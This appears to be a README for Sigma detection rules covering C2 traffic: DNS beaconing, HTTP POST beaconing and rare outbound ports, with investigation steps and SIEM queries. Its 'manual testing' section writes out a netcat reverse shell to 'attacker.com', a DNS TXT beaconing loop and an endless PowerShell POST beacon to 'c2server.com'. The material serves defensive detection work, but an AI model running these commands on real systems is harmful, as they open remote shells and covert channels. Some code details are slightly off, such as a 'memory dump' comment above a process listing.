# Command & Control Detection Rules

This directory contains 3 Sigma detection rules focused on identifying command and control (C2) communication channels used by attackers to control compromised systems.

## Rules Overview

| Rule ID | Rule Name | Severity | MITRE ATT&CK | FP Rate |
|---------|-----------|----------|--------------|---------|
| 016 | DNS Beaconing Detection | High | T1071.004, T1071, T1568.002 | 1.7% |
| 017 | Suspicious HTTP POST Activity | Medium | T1071.001, T1071, T1041 | 1.9% |
| 018 | Rare Outbound Port Usage | Medium | T1095, T1571, T1071 | 1.8% |

## Attack Scenario

Command and Control (C2) is the lifeline of an attack. After initial compromise, attackers need:
- **Persistent communication** with compromised systems
- **Command execution** capabilities
- **Data exfiltration** channels
- **Malware updates** and tool delivery

Without C2, attackers cannot:
- Execute commands remotely
- Steal data
- Maintain presence
- Coordinate multi-system attacks

## Detection Strategy

These rules detect C2 through multiple layers:

1. **DNS-based C2**: Covert channels using DNS queries (Rule 016)
2. **HTTP/HTTPS C2**: Blending with normal web traffic (Rule 017)
3. **Non-standard protocols**: Unusual ports and protocols (Rule 018)

## C2 Communication Methods

```
┌─────────────────────────────────────────────────────┐
│           C2 Communication Channels                  │
├─────────────────────────────────────────────────────┤
│  DNS (Rule 016)           │ Covert, rarely blocked  │
│  - TXT records            │ - Data exfiltration     │
│  - Subdomains             │ - Beaconing             │
│  - DGA domains            │ - Tunneling             │
├─────────────────────────────────────────────────────┤
│  HTTP/HTTPS (Rule 017)    │ Blends with normal traffic│
│  - POST requests          │ - Encrypted channel     │
│  - User agents            │ - Bi-directional        │
│  - Beaconing intervals    │ - High bandwidth        │
├─────────────────────────────────────────────────────┤
│  Non-Standard (Rule 018)  │ Avoids common filters   │
│  - High ports (>10000)    │ - Direct socket         │
│  - IRC (6667)             │ - Raw protocols         │
│  - Custom protocols       │ - Reverse shells        │
└─────────────────────────────────────────────────────┘
```

## Testing Recommendations

Use Atomic Red Team to simulate C2:

```powershell
# Test Rule 016: DNS Beaconing
Invoke-AtomicTest T1071.004 -TestNumbers 1,2

# Test Rule 017: HTTP C2
Invoke-AtomicTest T1071.001 -TestNumbers 1,2,3

# Test Rule 018: Rare Ports
Invoke-AtomicTest T1095 -TestNumbers 1
```

## Manual Testing Examples

**DNS tunneling simulation:**
```powershell
# Generate DNS TXT record queries
1..50 | % {
  Resolve-DnsName -Name "beacon$_.attacker.com" -Type TXT
  Start-Sleep -Seconds 5
}
```

**HTTP POST beaconing:**
```powershell
# PowerShell web request beaconing
while($true) {
  Invoke-WebRequest -Uri "http://c2server.com/beacon" -Method POST -Body "data"
  Start-Sleep -Seconds 60
}
```

**Netcat reverse shell (rare port):**
```cmd
nc.exe attacker.com 4444 -e cmd.exe
```

## False Positive Tuning

**Common false positives:**

**Rule 016 (DNS Beaconing):**
- Cloud services with many subdomains (AWS, Azure)
- CDN with frequent DNS queries
- Certificate transparency monitoring
- Legitimate dynamic DNS services

**Rule 017 (HTTP POST Activity):**
- Software update mechanisms
- Telemetry and analytics services
- API integrations
- Cloud storage sync (OneDrive, Dropbox)

**Rule 018 (Rare Outbound Ports):**
- Gaming applications
- VoIP software
- Remote desktop tools (non-standard ports)
- Development servers

**Tuning recommendations:**
1. **Whitelist by destination**: Allow known-good domains/IPs
2. **Baseline normal behavior**: Identify legitimate high-frequency DNS
3. **Process-based filtering**: Whitelist signed, known-good processes
4. **Time-based rules**: Alert on off-hours activity separately

## Investigation Workflow

When a C2 alert fires:

### Phase 1: Characterize the C2 Channel

1. **Identify the protocol:**
   - DNS? HTTP? Custom protocol?
   - What port(s)?
   - Encrypted or plaintext?

2. **Determine frequency:**
   - Continuous connection?
   - Beaconing (regular intervals)?
   - Event-triggered?

3. **Analyze destination:**
   ```bash
   # Check domain reputation
   whois <domain>
   nslookup <domain>

   # Check IP reputation
   grep <ip_address> threat_intel_feeds
   ```

### Phase 2: Identify Scope

4. **Find the infected process:**
   ```spl
   index=sysmon EventCode=3 DestinationIp=<c2_ip>
   | stats count by Image, User, CommandLine
   ```

5. **Check for multiple infected hosts:**
   ```spl
   index=proxy OR index=dns destination=<c2_domain>
   | stats dc(source_ip) as infected_hosts
   | where infected_hosts > 1
   ```

6. **Timeline analysis:**
   - When did C2 communication start?
   - Is it still active?
   - Volume of data transferred?

### Phase 3: Determine Impact

7. **Check for data exfiltration:**
   ```spl
   index=proxy OR index=firewall dest=<c2_ip>
   | stats sum(bytes_out) as total_exfil by source_ip
   | where total_exfil > 10000000  # > 10MB
   ```

8. **Identify commands executed:**
   - Process creation after C2 beacon
   - File modifications
   - Privilege escalation attempts

9. **Assess lateral movement:**
   - SMB connections from infected host
   - RDP sessions
   - Credential use on other systems

### Phase 4: Containment & Remediation

10. **Immediate containment:**
    - Block C2 domain/IP at firewall
    - Isolate infected host(s)
    - Disable affected user accounts

11. **Forensic collection:**
    ```powershell
    # Collect memory dump
    Get-Process | Export-Csv process_list.csv

    # Export network connections
    Get-NetTCPConnection | Export-Csv network_conns.csv

    # Collect DNS cache
    ipconfig /displaydns > dns_cache.txt
    ```

12. **Eradication:**
    - Remove malware persistence
    - Clean registry/scheduled tasks
    - Reset compromised credentials
    - Patch vulnerabilities

## C2 Framework Signatures

### Cobalt Strike
- **Default ports**: 50050, 443, 80, 8080, 8443
- **User agent**: Often custom or matches target environment
- **Beaconing**: Regular intervals (60s default, configurable)
- **DNS**: Supports DNS beaconing with TXT records
- **HTTP**: Uses malleable C2 profiles to mimic legitimate traffic

**Detection query:**
```spl
index=proxy DestinationPort IN (50050,4444,443,8443)
| stats count by source_ip, uri_path, user_agent
| where count > 20
```

### Metasploit
- **Default ports**: 4444, 4443, 8080
- **User agent**: "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
- **Reverse shells**: Often uses 4444/tcp
- **Meterpreter**: HTTPS on 443/8443

**Detection query:**
```spl
index=sysmon EventCode=3 DestinationPort IN (4444,4443)
| stats count by Image, DestinationIp
```

### Empire/PowerShell Empire
- **Protocol**: HTTPS (primarily)
- **User agent**: Configurable, often legitimate-looking
- **Beaconing**: PowerShell web requests
- **Default ports**: 80, 443

**Detection query:**
```spl
index=sysmon EventCode=3 Image="*powershell.exe" DestinationPort IN (80,443)
| stats count by CommandLine, DestinationIp
| where count > 10
```

### Cobalt Strike Malleable C2 Detection

Even with custom profiles, look for:
- Consistent Content-Length in POST requests
- Regular beaconing intervals
- HTTP headers in unusual order
- Suspicious URIs (/activity, /submit.php)

## Advanced Analysis Techniques

### Beaconing Detection Algorithm

```python
# Pseudo-code for beaconing detection
def detect_beaconing(connection_timestamps):
    intervals = calculate_intervals(connection_timestamps)
    mean_interval = statistics.mean(intervals)
    std_dev = statistics.stdev(intervals)

    # Low standard deviation = regular beaconing
    if std_dev < (mean_interval * 0.1):
        return True, mean_interval
    return False, None
```

### DNS Tunnel Detection via Entropy

```python
# High entropy in DNS queries indicates encoding/tunneling
import math

def calculate_entropy(string):
    prob = [float(string.count(c)) / len(string) for c in dict.fromkeys(list(string))]
    entropy = - sum([p * math.log(p) / math.log(2.0) for p in prob])
    return entropy

# Entropy > 3.5 typically indicates encoding
if calculate_entropy(dns_query) > 3.5:
    alert("Possible DNS tunneling detected")
```

### JA3/JA3S TLS Fingerprinting

```spl
# Identify C2 by TLS fingerprint
index=zeek sourcetype=ssl
| stats count by ja3_hash, dest_ip
| lookup c2_ja3_hashes.csv ja3_hash OUTPUT malware_family
| where isnotnull(malware_family)
```

## Network Security Monitoring Integration

### Zeek/Bro Integration

```zeek
# Zeek script to detect high-frequency DNS
@load base/frameworks/notice

global dns_threshold = 100;

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    local src = c$id$orig_h;
    # Count queries per source
    if (src in dns_query_count)
        ++dns_query_count[src];
    else
        dns_query_count[src] = 1;

    if (dns_query_count[src] > dns_threshold)
        NOTICE([$note=DNS_Beaconing, $src=src]);
}
```

### Suricata Rules

```
# Detect Cobalt Strike default beacon
alert tcp any any -> any [443,8443,50050] (msg:"Possible Cobalt Strike Beacon";
  flow:established,to_server;
  content:"POST"; http_method;
  threshold:type both, track by_src, count 10, seconds 300;
  sid:1000001;)
```

## Performance Optimization

**For high-volume environments:**

1. **Sampling**: Analyze 10% of DNS traffic initially
2. **Aggregation**: Count events before alerting
3. **Caching**: Store known-good domains in lookup tables
4. **Tiered alerting**: Different thresholds for different severity levels

**Optimized Splunk query:**
```spl
index=dns
| stats count by query, source_ip
| where count > 50  # Pre-filter high-frequency only
| lookup known_good_domains.csv query OUTPUT is_legitimate
| where isnull(is_legitimate)
| table source_ip, query, count
```

## Integration with SIEM

**Splunk - C2 Activity Dashboard:**
```spl
(index=dns OR index=proxy OR index=firewall)
| eval c2_category=case(
    query_type="TXT" AND query_count>10, "DNS C2",
    method="POST" AND src_process="powershell.exe", "HTTP C2",
    dest_port>10000 AND dest_port!=3389, "Rare Port C2",
    true(), "Other"
  )
| stats count by source_ip, c2_category, destination
| where c2_category != "Other"
```

**Elastic - C2 Correlation Rule:**
```json
{
  "query": {
    "bool": {
      "should": [
        {
          "bool": {
            "must": [
              {"match": {"dns.question.type": "TXT"}},
              {"range": {"dns.query_count": {"gte": 10}}}
            ]
          }
        },
        {
          "bool": {
            "must": [
              {"match": {"http.request.method": "POST"}},
              {"match": {"process.name": "powershell.exe"}}
            ]
          }
        }
      ],
      "minimum_should_match": 1
    }
  }
}
```

## References

- [MITRE ATT&CK: Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [SANS: DNS Tunneling Detection](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152)
- [Cobalt Strike Malleable C2 Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
- [ThreatConnect: C2 Infrastructure Analysis](https://threatconnect.com/blog/c2-infrastructure/)
